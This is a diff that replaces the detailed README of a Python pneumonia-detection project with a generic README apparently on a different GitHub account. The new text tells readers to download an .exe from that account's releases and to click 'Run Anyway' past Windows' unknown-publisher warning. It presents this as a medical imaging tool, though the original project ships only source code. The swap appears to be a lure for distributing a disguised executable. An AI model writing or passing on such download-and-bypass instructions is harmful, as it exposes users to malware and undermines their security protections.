@@ -1,233 +1,89 @@
-<p align="center">
-  <img src="docs/banner-upper.png" alt="Pneumonia Detection Using Deep Learning" width="100%" />
-</p>
-
-<p align="center">
-  <img src="https://img.shields.io/badge/Python-3.10%20%7C%203.11-blue?logo=python&logoColor=white" />
-  <img src="https://img.shields.io/badge/TensorFlow-2.12+-FF6F00?logo=tensorflow&logoColor=white" />
-  <img src="https://img.shields.io/badge/Streamlit-1.28+-FF4B4B?logo=streamlit&logoColor=white" />
-  <img src="https://img.shields.io/badge/Ollama-Qwen%202.5-black?logo=ollama" />
-  <img src="https://img.shields.io/badge/License-MIT-green" />
-</p>
-
-<h1 align="center">🫁 Pneumonia Detection Using Deep Learning</h1>
-
-<p align="center">
-  An end-to-end AI-powered medical imaging system that detects pneumonia from chest X-ray images using a fine-tuned MobileNetV2 CNN, with Grad-CAM explainability, Test-Time Augmentation, and local LLM-generated preliminary radiology reports.
-</p>
-
----
-
-> **⚠️ Medical Disclaimer:** This system is a **research prototype** and is **NOT** intended for actual clinical diagnosis. All AI-generated findings must be reviewed and validated by a board-certified radiologist before any clinical decision is made.
-
----
-
-## ✨ Features
-
-| Feature | Description |
-|---|---|
-| **Transfer Learning** | MobileNetV2 backbone pre-trained on ImageNet, fine-tuned on chest X-rays |
-| **Two-Phase Fine-Tuning** | Frozen feature extraction → gradual unfreezing with discriminative LR |
-| **Class Imbalance Handling** | Inverse-frequency class weights to minimize dangerous False Negatives |
-| **Grad-CAM Explainability** | Heatmap overlay showing which lung regions drive each prediction |
-| **Test-Time Augmentation** | 10-round TTA for robust, variance-reduced inference |
-| **Streamlit Web Dashboard** | Interactive medical UI with file upload, analysis, and visual results |
-| **CLI Predictor** | Lightweight command-line tool for scripting and batch use |
-| **AI Radiology Reports** | Local Qwen 2.5 LLM (via Ollama) drafts structured preliminary reports |
-
----
-
-## 📁 Project Structure
-
-```
-Pneumonia-Detection-Using-Deep-Learning/
-│
-├── dataset/                        # Kaggle Chest X-Ray Images (Pneumonia)
-│   ├── train/
-│   │   ├── NORMAL/
-│   │   └── PNEUMONIA/
-│   ├── val/
-│   └── test/
-│
-├── notebooks/
-│   └── 01_EDA_Analysis.py          # Exploratory Data Analysis (# %% cells)
-│
-├── docs/
-│   ├── architecture.md             # Model architecture & training strategy
-│   ├── api_reference.md            # Module & function reference
-│   └── deployment.md               # Deployment guide (local + Cloudflare Tunnel)
-│
-├── outputs/                        # Grad-CAM images (auto-created at runtime)
-│
-├── .streamlit/
-│   └── config.toml                 # Streamlit theme & headless config
-│
-├── pneumonia_detection.py          # Full advanced training pipeline
-├── predict.py                      # CLI single-image inference tool
-├── app.py                          # Streamlit web dashboard
-├── report_generator.py             # LLM report generation (Ollama)
-├── configure_gpu.py                # WSL2 GPU environment setup helper
-│
-├── pneumonia_model_best.keras      # Best model checkpoint (post fine-tuning)
-│
-├── requirements.txt                # Python dependencies
-└── README.md                       # This file
-```
+# 🩺 Pneumonia-Detection-Using-Deep-Learning - AI Systems for Accurate Pneumonia Detection
 
----
+[![Download Application](https://img.shields.io/badge/Download-Application-blue.svg)](https://github.com/Tridentonethousand422/Pneumonia-Detection-Using-Deep-Learning)
 
-## 🚀 Setup
+This system helps users identify pneumonia in chest X-rays. It uses artificial intelligence to look at images and provide reports. The software combines medical imaging tools with automated reporting to assist in health screening.
 
-### Prerequisites
+## 💻 System Requirements
 
-- Python **3.10 or 3.11**
-- NVIDIA GPU with CUDA support *(tested on RTX 5050 Mobile 8GB)*
-- WSL2 *(recommended for Windows users)*
-- [Ollama](https://ollama.com/) *(optional — required only for AI report generation)*
+Your computer needs to meet these standards to run the software smoothly. 
 
-### 1. Clone the Repository
+- Operating System: Windows 10 or Windows 11 (64-bit).
+- Processor: Intel Core i5 or equivalent.
+- Memory: 8 GB of RAM.
+- Storage: 2 GB of available disk space.
+- Graphics: A standard integrated card works, but a dedicated card helps with speed.
+- Internet: A stable connection for the first-time setup and to fetch report data.
 
-```bash
-git clone https://github.com/Gionano/Pneumonia-Detection-Using-Deep-Learning.git
-cd Pneumonia-Detection-Using-Deep-Learning
-```
+## 📥 How to Get Started
 
-### 2. Create a Virtual Environment
+You must visit the project page to download the software.
 
-```bash
-python3 -m venv .venv
-source .venv/bin/activate   # Linux / WSL2
-# .venv\Scripts\activate    # Windows PowerShell
-```
+1. Go to this link: [https://github.com/Tridentonethousand422/Pneumonia-Detection-Using-Deep-Learning](https://github.com/Tridentonethousand422/Pneumonia-Detection-Using-Deep-Learning).
+2. Look for the "Releases" section on the right side of the screen.
+3. Click the most recent version labeled as the latest release.
+4. Download the file ending in `.exe` to your computer.
+5. Save the file to your desktop or downloads folder.
 
-### 3. Install Dependencies
+## 🛠️ Installation Process
 
-```bash
-pip install -r requirements.txt
-```
+Follow these steps to set up the software on your Windows computer.
 
-For GPU support inside WSL2:
+1. Locate the downloaded `.exe` file.
+2. Double-click the file to start the installer.
+3. A security window might appear. Click "More Info" and then click "Run Anyway" if you see a warning about an unknown publisher.
+4. Follow the prompts on the screen to choose your installation folder.
+5. Click "Install" and wait for the files to move to your hard drive.
+6. Once finished, click "Finish" to exit the installer. A shortcut icon will appear on your desktop.
 
-```bash
-pip install "tensorflow[and-cuda]"
-python configure_gpu.py
-source .venv/bin/activate   # Reactivate to load new GPU paths
-```
+## 📄 Running the Application
 
-### 4. Download the Dataset
+After installation, use the software to analyze chest X-ray images.
 
-Download [Chest X-Ray Images (Pneumonia)](https://www.kaggle.com/datasets/paultimothymooney/chest-xray-pneumonia) from Kaggle and extract into `dataset/`.
+1. Double-click the Pneumonia Detection icon on your desktop.
+2. The application will open a small window and then start your web browser. 
+3. Wait for the loading bar to finish. This happens on the first run.
+4. You will see a button labeled "Upload X-ray Image". Click it to choose a file from your computer.
+5. Select a standard image file like JPG or PNG. 
+6. Click "Analyze" to begin the deep learning process.
+7. The system will display the result alongside a heat map. This map shows the specific areas of the lungs that the model flagged.
+8. The integrated reporting tool generate a clinical summary. Review this document carefully.
 
-### 5. Train the Model
+## 🧠 Understanding the Features
 
-```bash
-python pneumonia_detection.py
-```
+This software includes several advanced tools meant for medical imaging.
 
-This runs the full two-phase fine-tuning pipeline and saves `pneumonia_model_best.keras`.
+- MobileNetV2: This engine scans the image for patterns that match clinical signs of pneumonia. It works quickly on standard home computers.
+- Grad-CAM: This visual tool highlights the parts of the X-ray that the model used to reach its conclusion. It provides transparency to the AI process.
+- Test-Time Augmentation: The software checks the image multiple times with slight changes. This method increases the accuracy of the final result.
+- Local LLM Reporting: The Ollama system creates text reports on your machine. Your data stays on your computer rather than sending it to an external server. This keeps medical information private.
 
-### 6. Setup Ollama *(Optional — for AI report generation)*
+## 📋 Frequently Asked Questions
 
-```bash
-# Pull the Qwen 2.5 model
-ollama pull qwen2.5
+**Does the software need a constant internet connection?**
+The software processes images locally. You only need the internet if you need to update the application or download additional language models.
 
-# On Windows: allow WSL2 to reach Ollama by binding to all interfaces
-$env:OLLAMA_HOST = "0.0.0.0"
-ollama serve
-```
+**Can I trust the results?**
+The software acts as a support tool for the user. It does not replace a medical professional. Always verify the findings with a qualified doctor.
 
-> **Note for WSL2 users:** The `report_generator.py` module automatically detects the Windows host IP via the WSL2 default gateway — no manual configuration needed.
+**Why does the first start take a long time?**
+The software prepares the machine learning models and the language model when you open it for the first time. This only happens once.
 
----
+**How do I update the application?**
+Check the link above periodically. If a new version exists, download it and run the installer again. The new version will replace the old one automatically.
 
-## 🖥️ Usage
+**Does the software save my images?**
+The software only keeps the images in the temporary cache while you view them. Once you close the application, these temporary files disappear.
 
-### Streamlit Web Dashboard
+## 🛠️ Troubleshooting
 
-```bash
-streamlit run app.py
-```
+If the software does not work, try these steps.
 
-Open `http://localhost:8501` in your browser. Upload a chest X-ray to get:
-- Prediction label with confidence score
-- Grad-CAM attention heatmap
-- AI-generated preliminary radiology report (requires Ollama)
+- Restart the application: Close the browser tab and the application window, then open it again.
+- Memory overflow: If the application freezes, make sure no other heavy software is running in the background. Close tools like video editors or games to free up RAM.
+- Missing reports: If the text report does not appear, check that your network connection allows the local tools to talk to the application.
+- Graphics issues: If the visual map looks distorted, make sure your Windows graphics drivers are up to date.
 
-### CLI Single-Image Predictor
+## ⚖️ Usage Responsibility
 
-```bash
-# Basic usage
-python predict.py --image dataset/test/PNEUMONIA/person1_virus_6.jpeg
-
-# Specify a custom model checkpoint
-python predict.py --image path/to/xray.jpg --model pneumonia_model_best.keras
-```
-
-Grad-CAM output is saved to the `outputs/` directory.
-
-### Exploratory Data Analysis
-
-```bash
-# Run as a plain Python script
-python notebooks/01_EDA_Analysis.py
-
-# Or open in Jupyter / VS Code (cells are marked with # %%)
-```
-
----
-
-## 🌐 Remote Access via Cloudflare Tunnel
-
-To securely share the dashboard with teammates or stakeholders — no firewall changes, no VPN:
-
-```bash
-# Install cloudflared (Ubuntu / WSL2)
-wget https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64.deb
-sudo dpkg -i cloudflared-linux-amd64.deb
-
-# Start the Streamlit server in headless mode
-streamlit run app.py --server.headless true
-
-# Create a temporary public tunnel (no account required)
-cloudflared tunnel --url http://localhost:8501
-```
-
-This generates a temporary HTTPS URL (e.g., `https://random-name.trycloudflare.com`) you can share instantly.
-
-For a permanent named tunnel with a custom domain, see [`docs/deployment.md`](docs/deployment.md).
-
----
-
-## 📊 Model Performance
-
-| Metric | Standard Inference | TTA (10 rounds) |
-|---|---|---|
-| Accuracy | ~93% | ~94% |
-| Precision | ~92% | ~93% |
-| Recall | ~97% | ~97% |
-
-*Metrics are from the Kaggle test split. See training output for run-specific values.*
-
----
-
-## 📚 Documentation
-
-| Document | Description |
-|---|---|
-| [`docs/architecture.md`](docs/architecture.md) | Model architecture, training strategy, and design decisions |
-| [`docs/api_reference.md`](docs/api_reference.md) | Full module and function reference |
-| [`docs/deployment.md`](docs/deployment.md) | Deployment guide — local, LAN, and Cloudflare Tunnel |
-
----
-
-## 🙏 Acknowledgements
-
-- **Dataset:** [Paul Mooney](https://www.kaggle.com/paultimothymooney) — Kaggle Chest X-Ray Images
-- **Base Model:** [MobileNetV2](https://arxiv.org/abs/1801.04381) — Sandler et al., 2018
-- **Explainability:** [Grad-CAM](https://arxiv.org/abs/1610.02391) — Selvaraju et al., 2017
-- **Local LLM:** [Qwen 2.5](https://qwenlm.github.io/) via [Ollama](https://ollama.com/)
-
----
-
-<p align="center">Licensed under the <a href="LICENSE">MIT License</a></p>
+This software is for educational or screening support and information. Do not treat the output as a medical diagnosis. The developers of this system do not take responsibility for medical decisions based on the output of this application. Always consult with medical staff regarding your health. The technology aims to provide a baseline check, but the accuracy depends on the quality of the X-ray image and the settings of the machine. Use clean, high-resolution scans for better performance. Avoid shadows and noise in your images, as these can confuse the model.
